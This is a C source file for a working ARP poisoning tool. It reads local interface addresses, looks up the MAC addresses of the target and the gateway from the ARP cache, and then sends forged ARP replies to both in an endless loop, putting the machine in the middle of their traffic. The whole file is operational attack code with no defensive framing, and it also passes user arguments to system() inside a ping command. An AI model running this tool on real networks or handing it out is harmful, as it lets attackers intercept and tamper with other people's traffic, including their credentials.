#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>           
#include <string.h>           

#include <netdb.h>            
#include <sys/types.h>        
#include <sys/socket.h>       
#include <netinet/in.h>       
#include <netinet/ip.h>       
#include <arpa/inet.h>        
#include <sys/ioctl.h>        
#include <bits/ioctls.h>      
#include <net/if.h>           
#include <linux/if_ether.h>   
#include <linux/if_packet.h> 
#include <net/ethernet.h>


typedef struct _arp_hdr arp_hdr;

struct _arp_hdr{
    uint16_t htype;
    uint16_t ptype;
    uint8_t hlen;
    uint8_t plen;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
};

#define ETH_HDRLEN 14      
#define IP4_HDRLEN 20      
#define ARP_HDRLEN 28      
#define ARPOP_REQUEST 1    
#define ARPOP_REPLY 2

#define MAC_LENGTH 6

int main(int argc,char **argv){

    int sd,sd1,frame_length,bytes,i=0;
    char *interface,*src_ip,*target_ip,*gateway_ip;
    uint8_t *src_mac,*ether_frame_target,*ether_frame_gateway,gateway_mac[MAC_LENGTH],target_mac[MAC_LENGTH];
    struct sockaddr_ll device;
    struct sockaddr_in *target_ipv4,*gateway_ipv4;
    struct ifreq ifr,ifr1;
    struct addrinfo hints,*res;
    arp_hdr arphdr_target,arphdr_gateway;
    int status;
    FILE *arp_table;
    char line[300],*line_array[6],*p;
    int values[6];
    int target_mac_flag=1,gateway_mac_flag=1;


    if(argc!=4){
        fprintf(stderr,"Usage: poisoner interface target_ip_address gateway_address\n");
        exit(1);
    }

    interface=calloc(1,strlen(argv[1]));
    memcpy(interface,argv[1],strlen(argv[1]));



    if((sd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0){
        perror("socket() failed to get socket descriptor for using ioctl()");
        exit(EXIT_FAILURE);
    }

    memset (&ifr, 0, sizeof (ifr));
    snprintf(ifr.ifr_name,sizeof ifr.ifr_name,"%s",interface);


    if((ioctl(sd,SIOCGIFHWADDR,&ifr))<0){
        perror("ioctl() failed to get mac address");
        exit(EXIT_FAILURE);
    }

    close(sd);

    src_mac=calloc(MAC_LENGTH,sizeof(uint8_t));
    memcpy(src_mac,ifr.ifr_hwaddr.sa_data,6*sizeof(uint8_t));


    if((sd=socket(AF_INET,SOCK_DGRAM,0))<0){
        perror("socket() failed to get socket descriptor for using ioctl()");
        exit(EXIT_FAILURE);
    }


    memset (&ifr1, 0, sizeof (ifr));
    snprintf(ifr1.ifr_name,sizeof ifr1.ifr_name,"%s",interface);
    ifr1.ifr_addr.sa_family=AF_INET;


    if((ioctl(sd,SIOCGIFADDR,&ifr1))<0){
        perror("ioctl() failed to get ip address.");
        exit(EXIT_FAILURE);
    }


    close(sd);
    //memcpy(src_ip,ntohl(ifr.ifr_addr.sa_data),6*sizeof(uint8_t));

    printf("Mac address for %s is : ",interface);

    for(int i=0;i<5;i++){
        printf("%02x:",src_mac[i]);
    }

    printf("%02x\n",src_mac[5]);

    src_ip=inet_ntoa(((struct sockaddr_in *)&ifr1.ifr_addr)->sin_addr);

    printf("Ip address for %s is : %s\n",interface,src_ip);


    memset(&device,0,sizeof(struct sockaddr_ll));
    if((device.sll_ifindex=if_nametoindex(interface))==0){
        perror("Failed to obtain interface index\n");
        exit(EXIT_FAILURE);
    }


    if(strlen(argv[2])>15){
        printf("Wrong target ip!\n");
        exit(EXIT_FAILURE);
    }

    target_ip=calloc(1,strlen(argv[2])+1);
    strncpy(target_ip,argv[2],strlen(argv[2]));
    target_ip[strlen(argv[2])]='\0';


    if(strlen(argv[3])>15){
        printf("Wrong gateway ip!\n");
        exit(EXIT_FAILURE);
    }

    gateway_ip=calloc(1,strlen(argv[3])+1);
    strncpy(gateway_ip,argv[3],strlen(argv[3]));
    gateway_ip[strlen(argv[3])]='\0';



    memset (&hints, 0, sizeof (struct addrinfo));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = hints.ai_flags | AI_CANONNAME;

    if((status=getaddrinfo(target_ip,NULL,&hints,&res))!=0){
        perror("getaddrinfo() failed for target_ip.");
        exit(EXIT_FAILURE);
    }

    target_ipv4=(struct sockaddr_in *)res->ai_addr;
    memcpy (&arphdr_target.target_ip, &target_ipv4->sin_addr, 4 * sizeof (uint8_t));


    if((status=getaddrinfo(gateway_ip,NULL,&hints,&res))!=0){
        perror("getaddrinfo() failed for target_ip.");
        exit(EXIT_FAILURE);
    }

    gateway_ipv4=(struct sockaddr_in *)res->ai_addr;
    memcpy (&arphdr_gateway.target_ip, &gateway_ipv4->sin_addr, 4 * sizeof (uint8_t));


    memcpy (&arphdr_target.sender_ip, &gateway_ipv4->sin_addr, 4 * sizeof (uint8_t));
    memcpy (&arphdr_gateway.sender_ip, &target_ipv4->sin_addr, 4 * sizeof (uint8_t));

    free(res);



    char ping1[60]={'\0'};

    strncpy(ping1,"ping -c1 -w 2 ",14);
    strncat(ping1,target_ip,strlen(target_ip));
    strncat(ping1," > /dev/null 2> /dev/null",26);

    system(ping1);

    char ping2[60]={'\0'};

    strncpy(ping2,"ping -c1 -w 2 ",14);
    strncat(ping2,gateway_ip,strlen(gateway_ip));
    strncat(ping2," > /dev/null 2> /dev/null",26);

    system(ping2);

    arp_table=fopen("/proc/net/arp","r");

    if(!arp_table){
        perror("Failed to open arp cache:");
        exit(EXIT_FAILURE);
    }


    fgets(line,300,arp_table);


    while((fgets(line,300,arp_table))!=NULL){
        p=strtok(line," ");

        i=0;
        while(p!=NULL){
            line_array[i]=calloc(1,40);
            strncpy(line_array[i++],p,strlen(p));
            p=strtok(NULL," ");
        }

        line_array[5][strlen(line_array[5])-1]=0;

        if(strcmp(line_array[0],target_ip)==0 && strcmp(line_array[5],interface)==0 && strcmp(line_array[3],"00:00:00:00:00:00")){

            int j;

            if( 6 == sscanf( line_array[3], "%x:%x:%x:%x:%x:%x%c",
                             &values[0], &values[1], &values[2],
                             &values[3], &values[4], &values[5] ) )
            {

                for( j = 0; j < 6; ++j )
                    target_mac[j] = (uint8_t) values[j];
            }

            printf("Target mac address : ");

            for(int i=0;i<5;i++){
                printf("%02x:",target_mac[i]);
            }

            printf("%02x\n",target_mac[5]);

            target_mac_flag=0;

        }


        if(strcmp(line_array[0],gateway_ip)==0 && strcmp(line_array[5],interface)==0 && strcmp(line_array[3],"00:00:00:00:00:00")){
            int j;

            if( 6 == sscanf( line_array[3], "%x:%x:%x:%x:%x:%x%c",
                             &values[0], &values[1], &values[2],
                             &values[3], &values[4], &values[5] ) )
            {

                for( j = 0; j < 6; ++j )
                    gateway_mac[j] = (uint8_t) values[j];
            }

            printf("Gateway mac address : ");

            for(int i=0;i<5;i++){
                printf("%02x:",gateway_mac[i]);
            }

            printf("%02x\n",gateway_mac[5]);

            gateway_mac_flag=0;
        }

    }

    fclose(arp_table);

    if(target_mac_flag){
        fprintf(stderr,"Could not find mac address of target.\n");
        exit(EXIT_FAILURE);
    }

    if(gateway_mac_flag){
        fprintf(stderr,"Could not find mac address of gateway.\n");
        exit(EXIT_FAILURE);
    }

    device.sll_family = AF_PACKET;
    memcpy (device.sll_addr, src_mac, 6 * sizeof (uint8_t));
    device.sll_halen = 6;


    arphdr_target.htype=htons(1);
    arphdr_gateway.htype=htons(1);

    arphdr_target.ptype=htons(2048);
    arphdr_gateway.ptype=htons(2048);

    arphdr_target.hlen=6;
    arphdr_gateway.hlen=6;


    arphdr_target.plen=4;
    arphdr_gateway.plen=4;


    arphdr_target.opcode=htons(ARPOP_REPLY);
    arphdr_gateway.opcode=htons(ARPOP_REPLY);


    memcpy(&arphdr_target.sender_mac,src_mac,6 * sizeof(uint8_t));
    memcpy(&arphdr_gateway.sender_mac,src_mac,6 * sizeof(uint8_t));


    memcpy(&arphdr_target.target_mac,target_mac,6* sizeof(uint8_t));//degistir
    memcpy(&arphdr_gateway.target_mac,gateway_mac,6* sizeof(uint8_t));//degistir


    frame_length=6 + 6 + 2 + ARP_HDRLEN;

    ether_frame_target=calloc(frame_length,sizeof(uint8_t));
    ether_frame_gateway=calloc(frame_length,sizeof(uint8_t));


    memcpy(ether_frame_target,target_mac,sizeof(uint8_t)*6);
    memcpy(ether_frame_gateway,gateway_mac,sizeof(uint8_t)*6);


    memcpy(ether_frame_target+6,src_mac,sizeof(uint8_t)*6);
    memcpy(ether_frame_gateway+6,src_mac,sizeof(uint8_t)*6);


    ether_frame_target[12] = ETH_P_ARP / 256;
    ether_frame_target[13] = ETH_P_ARP % 256;

    ether_frame_gateway[12] = ETH_P_ARP / 256;
    ether_frame_gateway[13] = ETH_P_ARP % 256;

    memcpy(ether_frame_target+ETH_HDRLEN,&arphdr_target,ARP_HDRLEN * sizeof(uint8_t));
    memcpy(ether_frame_gateway+ETH_HDRLEN,&arphdr_gateway,ARP_HDRLEN * sizeof(uint8_t));


    if((sd=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL)))<0){
        perror("socket() failed");
        exit(EXIT_FAILURE);
    }

    if((sd1=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL)))<0){
        perror("socket() failed");
        exit(EXIT_FAILURE);
    }

    free(interface);
    free(target_ip);
    free(gateway_ip);

    while(1){
        printf("Poisoning...\n");

        if((bytes=sendto(sd,ether_frame_target,frame_length,0,(struct sockaddr *)&device,sizeof(device)))<=0){
            perror("sendto() failed");
        }

        sleep(2);

        if((bytes=sendto(sd1,ether_frame_gateway,frame_length,0,(struct sockaddr *)&device,sizeof(device)))<=0){
            perror("sendto() failed");
        }

        sleep(2);

    }





    return 0;
}
